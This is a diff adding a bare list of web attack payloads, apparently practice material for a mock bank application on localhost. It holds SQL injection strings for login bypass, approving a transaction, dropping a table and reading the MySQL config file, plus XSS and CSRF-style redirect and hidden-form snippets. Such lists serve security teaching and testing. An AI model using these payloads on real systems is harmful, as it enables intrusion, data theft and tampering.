@@ -1,0 +1,22 @@
+' or '1'='1';--
+' or '1'='1' LIMIT 0,1;--
+' or '1'='1' LIMIT 1,2;--
+'; UPDATE history set zatwierdzone=1 where amount='10000.0000';--
+SELECT * FROM students WHERE name = 'Robert'); DROP TABLE students; --'
+SELECT LOAD_FILE('/etc/mysql/my.cnf');
+
+
+<script type="text/javascript">
+ alert("XSS done");
+</script>
+
+inline
+
+<script type="text/javascript">
+ window.location = "http://localhost/bank.com/potwierdz.php?user_id=18";
+</script>
+
+<form action="przeslij.php" method="POST">
+  <input type="hidden" name="nr" value="2"/>
+  <input type="submit" value="Treść przycisku"/>
+</form>
